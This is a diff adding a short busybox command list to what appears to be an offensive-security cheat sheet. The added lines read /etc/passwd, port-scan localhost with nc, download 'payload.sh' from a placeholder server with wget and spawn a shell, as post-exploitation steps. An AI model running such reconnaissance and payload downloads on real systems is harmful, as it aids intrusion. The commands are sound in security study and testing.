@@ -100,3 +100,21 @@ Currently defined functions:
         uudecode, uuencode, vconfig, vi, vlock, volname, w, wall, watch, watchdog, wc, wget, which, who, whoami, whois, xargs, xxd, xz, xzcat, yes, zcat,
         zcip
 ```
+
+- More commands :
+```
+bash# List users
+busybox cat /etc/passwd
+
+# Check network interfaces
+busybox ifconfig
+
+# Scan for open ports (if netcat is available)
+busybox nc -zv 127.0.0.1 1-1024
+
+# Download a script or tool
+busybox wget http://yourserver/payload.sh
+
+# Get a shell
+busybox sh
+```
